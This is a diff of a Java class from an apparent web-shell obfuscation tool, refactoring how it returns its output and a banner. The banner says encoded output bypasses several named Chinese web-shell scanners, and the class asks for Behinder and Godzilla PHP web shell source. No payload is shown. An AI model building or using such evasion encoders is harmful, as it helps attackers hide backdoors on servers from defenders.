@@ -1,8 +1,6 @@
 package encode;
 
 import application.RandomString;
-import java.io.File;
-import java.io.FileInputStream;
 import java.nio.charset.StandardCharsets;
 import java.util.Base64;
 import java.util.Random;
@@ -12,7 +10,6 @@ public class PhpEncodeDemo1 {
     String key;
     String sourcecode;
     String encode;
-    String demo1txt;
 
     public PhpEncodeDemo1() {
     }
@@ -22,7 +19,16 @@ public class PhpEncodeDemo1 {
         this.key = key;
         this.sourcecode = code;
     }
-    public String[] Run(){
+
+    public static String GetDemotxt(){
+
+        return"/*\n" +
+                " * By: XG小刚\n" +
+                " * Time: 2023-09-02_demo1\n" +
+                " * Bypass: 牧云、伏魔、安全狗、D盾、河马本地\n" +
+                " */";
+    }
+    public String Run(){
 
         if(!sourcecode.isEmpty()){
             try {
@@ -54,17 +60,12 @@ public class PhpEncodeDemo1 {
                 encode = encode.replace("$key$",this.key);
                 encode = encode.replace("$base64code$",s);
 
-                demo1txt = "/*\n" +
-                        " * By: XG小刚\n" +
-                        " * Time: 2023-09-02_demo1\n" +
-                        " * Bypass: 牧云、伏魔、安全狗、D盾、河马本地\n" +
-                        " */";
-                return new String[]{this.encode,this.demo1txt};
+                return this.encode;
             }catch (Exception e){
-                return new String[]{"加密失败",this.demo1txt};
+                return "加密失败";
             }
         }else {
-            return new String[]{"请输入冰蝎、哥斯拉PHP源码",this.demo1txt};
+            return "请输入冰蝎、哥斯拉PHP源码";
         }
 
     }
